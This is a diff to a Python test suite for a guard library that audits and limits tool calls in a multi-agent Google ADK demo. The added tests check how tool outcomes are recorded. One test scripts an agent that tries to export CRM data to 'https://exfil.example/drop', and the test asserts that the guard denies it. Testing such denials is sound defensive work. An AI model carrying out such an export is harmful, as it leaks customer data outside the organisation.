@@ -47,6 +47,7 @@ from attenu_guard import (  # noqa: E402
     ReasonCode,
     RowLimit,
 )
+from attenu_guard.reasons import BodyState, Capture  # noqa: E402
 
 # --------------------------------------------------------------------------
 # Load the example modules by path.
@@ -121,7 +122,7 @@ def _function_responses(events) -> dict:
     return out
 
 
-def _build(scripts: dict, *, plugin_kwargs=None):
+def _build(scripts: dict, *, plugin_kwargs=None, tools=None, issue_kwargs=None):
     """Build the orchestrator/summarizer tree from demo.py with a scripted model."""
     calls: list = []
     model = demo.ScriptedLlm(script=scripts)
@@ -130,7 +131,7 @@ def _build(scripts: dict, *, plugin_kwargs=None):
         model=model,
         description="Summarizes CRM data.",
         instruction="Summarize the Q3 pipeline.",
-        tools=[demo.make_crm_query(calls), demo.make_crm_export(calls)],
+        tools=tools if tools is not None else [demo.make_crm_query(calls), demo.make_crm_export(calls)],
     )
     orchestrator = LlmAgent(
         name="orchestrator",
@@ -139,7 +140,8 @@ def _build(scripts: dict, *, plugin_kwargs=None):
         instruction="Delegate to the summarizer.",
         sub_agents=[summarizer],
     )
-    root_guard = Guard.issue("orchestrator", ROOT_AUTHORITY, task="quarterly review")
+    root_guard = Guard.issue("orchestrator", ROOT_AUTHORITY, task="quarterly review",
+                             **(issue_kwargs or {}))
     kwargs = {
         "root_agent_name": "orchestrator",
         "delegations": {"summarizer": SUMMARIZER_REQUEST},
@@ -763,3 +765,117 @@ def test_delegation_lifecycle_end_is_recorded_when_the_child_returns():
     root_guard, plugin = asyncio.run(scenario())
     dones = [e for e in root_guard.audit_log().entries if e.get("event") == "done"]
     assert [e["agent"] for e in dones] == ["summarizer"] and plugin.guard_for("summarizer").is_complete
+
+
+# ==========================================================================
+# Execution binding (0.9.0): record_outcome() on a schema_version=2 chain.
+# ==========================================================================
+def _make_crm_query_boom():
+    def crm_query(rows: int) -> dict:
+        """Raises instead of returning."""
+        raise ValueError("boom")
+
+    return crm_query
+
+
+def test_v2_allowed_tool_call_records_a_returned_outcome():
+    async def scenario():
+        runner, sessions, root_guard, plugin, calls = _build(
+            {
+                "orchestrator": [_fc("transfer_to_agent", agent_name="summarizer")],
+                "summarizer": [_fc("crm_query", rows=10), _text("done")],
+            },
+            issue_kwargs={"schema_version": 2},
+        )
+        session = await sessions.create_session(app_name="dg-adk-test", user_id="u")
+        await _drive(runner, session, "go")
+        return root_guard
+
+    root_guard = asyncio.run(scenario())
+    entries = root_guard.audit_log().entries
+    allow = next(e for e in entries if e["event"] == "allow" and e.get("tool") == "crm_query")
+    outcome = next(e for e in entries if e["event"] == "outcome" and e.get("call_id") == allow["call_id"])
+    assert allow["capture"] == Capture.FRAMEWORK_POST_HOOK
+    assert allow["adapter"]["module"] == "attenu_guard.adapters.google_adk"
+    assert outcome["body_state"] == BodyState.RETURNED
+    assert allow["authorized_params_hash"] == outcome["invoked_params_hash"]
+    assert isinstance(outcome["duration_ms"], int) and outcome["duration_ms"] >= 0
+
+
+def test_v2_a_tool_that_raises_records_a_raised_outcome_with_error_code():
+    """Unlike CrewAI and the OpenAI Agents SDK, ADK does not swallow the tool's exception
+    before this plugin's on_tool_error_callback runs, so RAISED is genuinely observed here.
+
+    This plugin's on_tool_error_callback always returns None (it only observes, per the
+    module docstring), so -- with no OTHER error callback configured -- ADK's own default
+    behaviour applies: the original exception still propagates and the run fails. That is
+    unrelated to execution binding; record_outcome() already ran, synchronously, before the
+    exception left on_tool_error_callback, so the ledger is checked from the failure."""
+    async def scenario():
+        runner, sessions, root_guard, plugin, calls = _build(
+            {
+                "orchestrator": [_fc("transfer_to_agent", agent_name="summarizer")],
+                "summarizer": [_fc("crm_query", rows=10), _text("done")],
+            },
+            tools=[_make_crm_query_boom(), demo.make_crm_export([])],
+            issue_kwargs={"schema_version": 2},
+        )
+        session = await sessions.create_session(app_name="dg-adk-test", user_id="u")
+        try:
+            await _drive(runner, session, "go")
+        except Exception:
+            pass  # the tool's own exception propagating is expected -- see the docstring above
+        return root_guard
+
+    root_guard = asyncio.run(scenario())
+    entries = root_guard.audit_log().entries
+    outcomes = [e for e in entries if e["event"] == "outcome"]
+    assert outcomes, entries
+    assert outcomes[-1]["body_state"] == BodyState.RAISED
+    assert outcomes[-1]["error_code"] == "ValueError"
+
+
+def test_v1_guard_gets_no_call_id_capture_or_outcome():
+    async def scenario():
+        runner, sessions, root_guard, plugin, calls = _build({
+            "orchestrator": [_fc("transfer_to_agent", agent_name="summarizer")],
+            "summarizer": [_fc("crm_query", rows=10), _text("done")],
+        })
+        session = await sessions.create_session(app_name="dg-adk-test", user_id="u")
+        await _drive(runner, session, "go")
+        return root_guard
+
+    root_guard = asyncio.run(scenario())
+    entries = root_guard.audit_log().entries
+    allow = next(e for e in entries if e["event"] == "allow" and e.get("tool") == "crm_query")
+    assert "call_id" not in allow and "capture" not in allow
+    assert [e for e in entries if e["event"] == "outcome"] == []
+
+
+def test_v2_denied_tool_call_never_records_an_outcome():
+    async def scenario():
+        runner, sessions, root_guard, plugin, calls = _build(
+            {
+                "orchestrator": [_fc("transfer_to_agent", agent_name="summarizer")],
+                "summarizer": [
+                    _fc("crm_query", rows=4200),
+                    _fc("crm_export", destination="https://exfil.example/drop"),
+                    _text("done"),
+                ],
+            },
+            issue_kwargs={"schema_version": 2},
+        )
+        session = await sessions.create_session(app_name="dg-adk-test", user_id="u")
+        await _drive(runner, session, "go")
+        return root_guard, calls
+
+    root_guard, calls = asyncio.run(scenario())
+    assert not any(name == "crm_export" for name, _ in calls)
+    entries = root_guard.audit_log().entries
+    assert any(e["event"] == "deny" and e.get("tool") == "crm_export" for e in entries)
+    # the export never allowed, and only the (single, allowed) crm_query call got an outcome
+    export_allows = [e for e in entries if e["event"] == "allow" and e.get("tool") == "crm_export"]
+    assert export_allows == []
+    outcomes = [e for e in entries if e["event"] == "outcome"]
+    allow_call_ids = {e["call_id"] for e in entries if e["event"] == "allow"}
+    assert outcomes and all(o["call_id"] in allow_call_ids for o in outcomes)
